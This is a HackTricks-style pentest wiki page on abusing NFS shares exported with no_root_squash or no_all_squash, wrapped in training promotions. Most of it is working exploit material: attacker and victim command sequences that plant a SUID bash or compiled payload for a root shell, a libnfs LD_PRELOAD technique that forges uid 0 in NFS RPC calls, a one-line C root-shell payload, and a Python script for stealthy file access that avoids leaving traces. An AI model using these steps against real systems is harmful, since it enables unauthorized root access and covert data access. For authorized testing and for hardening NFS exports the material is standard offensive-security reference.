

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.

**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

# Privilege Escalation

## Remote Exploit

If you have found this vulnerability, you can exploit it:

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

## Local Exploit

{% hint style="info" %}
Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
\--_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
{% endhint %}

## Basic Information

The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.

### Compiling the Library

The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. The compilation process involves the following commands:

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

### Conducting the Exploit

The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:

1. **Compile the exploit code:**
   ```bash
   cat pwn.c
   int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
   gcc pwn.c -o a.out
   ```

2. **Place the exploit on the share and modify its permissions by faking the uid:**
   ```bash
   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
   ```

3. **Execute the exploit to gain root privileges:**
   ```bash
   /mnt/share/a.out
   #root
   ```

## Bonus: NFShell for Stealthy File Access
Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Run like:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}



